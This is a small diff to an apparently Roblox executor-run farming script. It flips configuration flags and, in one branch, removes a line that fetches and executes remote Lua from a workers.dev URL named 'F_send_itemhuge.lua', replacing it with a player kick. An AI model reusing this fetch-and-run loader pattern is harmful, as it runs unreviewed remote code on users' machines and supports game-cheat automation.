@@ -1,7 +1,7 @@
 task.spawn(function()
 
-_G.start_vvv_ = false
-_G.delay_play_vvv3 = 1
+_G.start_vvv_ = true
+_G.delay_play_vvv3 = 3
 _G.FPS_farm = 4
 
 
@@ -22,7 +22,7 @@ end
 --task.wait(3600)
 
 
-local _Config_Online = 15
+local _Config_Online = 16
 local FILE_NAME = "OFFLINE.txt"
 if not writefile or not readfile then    return	end
 local function getOffline()
@@ -53,8 +53,7 @@ if _Config_Offline ~= _Config_Online then
 		if EVENT_or_FARM == "E" then
 			--game.Players.LocalPlayer:Kick("kick reset")		
 		end
-		--game.Players.LocalPlayer:Kick("kick reset")		
-		loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/F_send_itemhuge.lua"))()
+		game.Players.LocalPlayer:Kick("kick reset")		
 		--------------------------------------------
 end
 
